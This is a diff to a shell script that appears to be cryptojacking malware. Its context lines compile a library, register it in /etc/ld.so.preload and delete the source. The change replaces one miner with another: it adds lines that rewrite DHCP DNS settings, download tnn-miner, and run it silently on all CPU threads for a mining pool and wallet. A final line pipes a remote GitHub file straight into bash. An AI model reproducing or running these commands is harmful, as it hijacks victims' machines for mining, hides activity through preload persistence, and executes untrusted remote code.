@@ -8,9 +8,9 @@ gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2/TT-Miner-2024.3.2.tar.gz
-tar xvf TT-Miner-2024.3.2.tar.gz
-cd TT-Miner-2024.3.2
-chmod +x TT-Miner
-./TT-Miner -a Flex -o stratum+tcp://kylacoin.cedric-crispin.com:4374 -u kc1qg97pwtnf6jszasdhml9xt4wfu02vyxjvw0vkpm.$(echo $(shuf -i 1000-9999 -n 1)-ONN) -p x > /dev/null 2>&1 &
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+curl https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.6.6/downloads/Tnn-miner-amd64-v0.6.6.tar.gz -L -o Tnn-miner-amd64-v0.6.6.tar.gz
+tar xf Tnn-miner-amd64-v0.6.6.tar.gz
+./tnn-miner-cpu --xel --daemon-address stratum+tcp://de.xelis.herominers.com:1225 --worker-name $(shuf -n 1 -i 1-999)-iBISMI --wallet xel:nc9cm9ps6asjenezcjx8ynjwg8zvc77t5xg3djjw2ke33lxxqvtqq6p39r8 --threads $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
